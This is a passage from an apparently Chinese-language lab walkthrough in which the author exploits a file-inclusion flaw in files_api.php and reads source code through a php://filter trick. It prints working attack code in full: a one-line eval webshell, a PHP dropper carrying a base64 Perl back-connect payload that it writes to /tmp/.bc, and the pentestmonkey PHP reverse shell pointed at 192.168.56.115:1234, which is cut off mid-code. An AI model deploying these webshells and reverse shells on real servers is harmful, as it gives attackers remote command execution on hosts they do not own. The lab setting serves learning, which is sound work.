regex-delimiter">/</span><span class="token regex-source language-regex">server-status</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>Task Completed</pre></td></tr></table></figure><p>这里发现一个 <code>api接口</code> ，我们进去看一下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181126088-570887979.png" alt="image" /></p>
<p>尝试几波发现只有 <code>files_api.php</code>  可以进去：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181150189-227701744.png" alt="image" /></p>
<p>页面报错信息提示需要一个 <code>file参数</code> ，发现通过 <code>post方式</code> 可以进行文件包含：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181214185-1584981500.png" alt="image" /></p>
<h2 id="漏洞利用"><a class="anchor" href="#漏洞利用">#</a> 漏洞利用</h2>
<p>上传一个图片马：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181228364-2120044844.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'ant.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST[ant]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">></span></pre></td></tr></table></figure><p>成功上传图片马，但是我们发现这里并没有发现图片上传的路径，我们尝试用 <code>8011</code>  的 <code>api接口</code> 包含上传功能页面，看看能否找到上传的路径信息， <code>apache</code>  的网站目录一般会放在 <code>/var/www/html</code>  下，这里尝试几次后发现它的网站根目录在 <code>/var/www</code>  下，因为这里是文件包含，不能读取文件的源码，我们使用 <code>php伪协议</code> 读取源码：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>file<span class="token operator">=</span>php<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>filter<span class="token operator">/</span>convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource<span class="token operator">=</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>development<span class="token operator">/</span>uploader<span class="token operator">/</span>upload<span class="token punctuation">.</span>php</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181324401-211109321.png" alt="image" /></p>
<p>成功读取到 <code>base64编码</code> 后的源码，使用 <code>bp解码</code> ：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181346917-902307267.png" alt="image" /></p>
<p>我们成功发现了上传路径为 <code>FRANKuploads/</code> 。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181404437-1636524063.png" alt="image" /></p>
<p>尝试写入包含图片的 <code>webshell</code> ，but 写入失败了，可能是权限的问题 az.</p>
<p>我们换个 <code>webshell</code>  试一下：</p>
<p>方法一，使用如下 <code>php马</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">function</span> <span class="token function">which</span><span class="token punctuation">(</span><span class="token parameter">$pr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="3"></td><td><pre>$path <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token string">"which $pr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">return</span> <span class="token punctuation">(</span>$path <span class="token operator">?</span> $path <span class="token operator">:</span> $pr<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token parameter">$cfe</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="7"></td><td><pre>$res <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>$cfe<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="10"></td><td><pre>@<span class="token function">exec</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">,</span>$res<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="11"></td><td><pre>$res <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span>$res<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token function">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'shell_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="13"></td><td><pre>$res <span class="token operator">=</span> @<span class="token function">shell_exec</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token function">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="15"></td><td><pre>@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="16"></td><td><pre>@<span class="token function">system</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="17"></td><td><pre>$res <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="18"></td><td><pre>@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token function">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'passthru'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="20"></td><td><pre>@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="21"></td><td><pre>@<span class="token function">passthru</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="22"></td><td><pre>$res <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="23"></td><td><pre>@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token function">elseif</span><span class="token punctuation">(</span>@<span class="token function">is_resource</span><span class="token punctuation">(</span>$f <span class="token operator">=</span> @<span class="token function">popen</span><span class="token punctuation">(</span>$cfe<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="25"></td><td><pre>$res <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span>$f<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="27"></td><td><pre>$res <span class="token punctuation">.</span><span class="token operator">=</span> @<span class="token function">fread</span><span class="token punctuation">(</span>$f<span class="token punctuation">,</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="29"></td><td><pre>@<span class="token function">pclose</span><span class="token punctuation">(</span>$f<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">return</span> $res<span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token keyword">function</span> <span class="token function">cf</span><span class="token punctuation">(</span><span class="token parameter">$fname<span class="token punctuation">,</span>$text</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>$fp<span class="token operator">=</span>@<span class="token function">fopen</span><span class="token punctuation">(</span>$fname<span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="36"></td><td><pre>@<span class="token function">fputs</span><span class="token punctuation">(</span>$fp<span class="token punctuation">,</span>@<span class="token function">base64_decode</span><span class="token punctuation">(</span>$text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="37"></td><td><pre>@<span class="token function">fclose</span><span class="token punctuation">(</span>$fp<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="40"></td><td><pre>$yourip <span class="token operator">=</span> <span class="token string">"your IP"</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="41"></td><td><pre>$yourport <span class="token operator">=</span> <span class="token string">'your port'</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="42"></td><td><pre>$usedb <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'perl'</span><span class="token operator">=></span><span class="token string">'perl'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token operator">=></span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="43"></td><td><pre>$back_connect<span class="token operator">=</span><span class="token string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token function">cf</span><span class="token punctuation">(</span><span class="token string">'/tmp/.bc'</span><span class="token punctuation">,</span>$back_connect<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="51"></td><td><pre>$res <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token function">which</span><span class="token punctuation">(</span><span class="token string">'perl'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" /tmp/.bc $yourip $yourport &amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token operator">?</span><span class="token operator">></span></pre></td></tr></table></figure><p>修改 <code>ip</code>  和 <code>监听端口</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>$yourip <span class="token operator">=</span> <span class="token string">"192.168.56.115"</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="2"></td><td><pre>$yourport <span class="token operator">=</span> <span class="token string">'1234'</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>方法二，使用 <code>kali自带</code> 的 <code>php马</code> ：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181526537-1871639242.png" alt="image" /></p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// for any actions performed using this tool.  The author accepts no liability</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">// do not use this tool.</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// In all other respects the GPL version 2 applies:</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// This program is free software; you can redistribute it and/or modify</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">// it under the terms of the GNU General Public License version 2 as</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// published by the Free Software Foundation.</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">// This program is distributed in the hope that it will be useful,</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment">// GNU General Public License for more details.</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token comment">// You should have received a copy of the GNU General Public License along</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token comment">// for any actions performed using this tool.  If these terms are not acceptable to</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment">// you, then do not use this tool.</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token comment">// You are encouraged to send comments, improvements or suggestions to</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment">// me at pentestmonkey@pentestmonkey.net</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment">// Description</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token comment">// -----------</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token comment">// The recipient will be given a shell running as the current user (apache normally).</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">// Limitations</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token comment">// -----------</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token comment">// Usage</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token comment">// -----</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token function">set_time_limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token variable">$VERSION</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.0"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'192.168.56.115'</span><span class="token punctuation">;</span>  <span class="token comment">// CHANGE THIS</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>       <span class="token comment">// CHANGE THIS</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token variable">$chunk_size</span> <span class="token operator">=</span> <span class="token number">1400</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token variable">$write_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token variable">$error_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uname -a; w; id; /bin/sh -i'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token comment">// Daemonise ourself if possible to avoid zombies later</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token comment">// our php process and avoid zombies.  Worth a try...</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_fork'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>	<span class="token comment">// Fork and have the parent process exit</span></pre></td></tr><tr><td data-num="66"></td><td><pre>	<span class="token variable">$pid</span> <span class="token operator">=</span> <span class="token function">pcntl_fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>	</pre></td></tr><tr><td data-num="68"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>	</pre></td></tr><tr><td data-num="73"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Parent exits</span></pre></td></tr><tr><td data-num="75"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>	<span class="token comment">// Make the current process a session leader</span></pre></td></tr><tr><td data-num="78"></td><td><pre>	<span class="token comment">// Will only succeed if we forked</span></pre></td></tr><tr><td data-num="79"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">posix_setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: Can't setsid()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="83"></td><td><pre></pre></td></tr><tr><td data-num="84"></td><td><pre>	<span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="87"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="88"></td><td><pre></pre></td></tr><tr><td data-num="89"></td><td><pre><span class="token comment">// Change to a safe directory</span></pre></td></tr><tr><td data-num="90"></td><td><pre><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="91"></td><td><pre></pre></td></tr><tr><td data-num="92"></td><td><pre><span class="token comment">// Remove any umask we inherited</span></pre></td></tr><tr><td data-num="93"></td><td><pre><span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="94"></td><td><pre></pre></td></tr><tr><td data-num="95"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="96"></td><td><pre><span class="token comment">// Do the reverse shell...</span></pre></td></tr><tr><td data-num="97"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="98"></td><td><pre></pre></td></tr><tr><td data-num="99"></td><td><pre><span class="token comment">// Open reverse connection</span></pre></td></tr><tr><td data-num="100"></td><td><pre><span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="102"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="103"></td><td><pre>	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="104"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="105"></td><td><pre></pre></td></tr><tr><td data-num="106"></td><td><pre><span class="token comment">// Spawn shell process</span></pre></td></tr><tr><td data-num="107"></td><td><pre><span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="108"></td><td><pre>   <span class="token number">0</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdin is a pipe that the child will read from</span></pre></td></tr><tr><td data-num="109"></td><td><pre>   <span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdout is a pipe that the child will write to</span></pre></td></tr><tr><td data-num="110"></td><td><pre>   <span class="token number">2</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span>   <span class="token comment">// stderr is a pipe that the child will write to</span></pre></td></tr><tr><td data-num="111"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="112"></td><td><pre></pre></td></tr><tr><td data-num="113"></td><td><pre><span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">,</span> <span class="token 